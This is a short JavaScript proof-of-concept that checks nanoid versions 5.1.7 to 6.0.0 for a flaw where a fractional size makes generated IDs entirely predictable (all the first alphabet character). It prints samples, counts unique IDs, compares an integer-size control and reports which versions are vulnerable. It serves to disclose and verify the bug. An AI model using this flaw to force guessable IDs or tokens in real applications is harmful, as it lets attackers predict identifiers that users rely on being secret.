// PoC: nanoid 5.1.8 - 5.1.16 returns predictable IDs for a non-integer size.
//
// customRandom() uses `size` directly as the loop counter. With a fractional
// size (e.g. 16.5) every index into the random byte array is fractional,
// `bytes[i]` is undefined, `undefined & mask` is 0, so every character is
// alphabet[0]. Fixed in 6.0.0 by `let i = (size |= 0)` (ai/nanoid#616).

const VERSIONS = ['5.1.7', '5.1.8', '5.1.16', '6.0.0']
const ALPHABET = '0123456789abcdef' // power-of-two length (16)
const SIZE = 16.5
const RUNS = 1000

let anyVulnerable = false

for (const version of VERSIONS) {
  const { customAlphabet, customRandom, random } = await import(
    `nanoid-${version}`
  )

  // Path 1: customAlphabet() with a non-integer size at call time
  const gen = customAlphabet(ALPHABET)
  const ids = new Set()
  for (let i = 0; i < RUNS; i++) ids.add(gen(SIZE))
  const sample = gen(SIZE)

  // Path 2: customRandom() called directly
  const genRandom = customRandom(ALPHABET, 21, random)
  const sampleRandom = genRandom(SIZE)

  // Control: integer size on the same generator
  const control = gen(16)

  const vulnerable = ids.size === 1 && /^0+$/.test(sample)
  if (vulnerable) anyVulnerable = true

  console.log(`nanoid ${version}`)
  console.log(`  customAlphabet(...)(${SIZE})       -> ${sample}`)
  console.log(`  customRandom(...)(${SIZE})         -> ${sampleRandom}`)
  console.log(`  unique IDs in ${RUNS} calls         -> ${ids.size}`)
  console.log(`  control customAlphabet(...)(16)  -> ${control}`)
  console.log(`  result                           -> ${vulnerable ? 'VULNERABLE (fully predictable output)' : 'not affected'}`)
  console.log()
}

process.exitCode = anyVulnerable ? 1 : 0
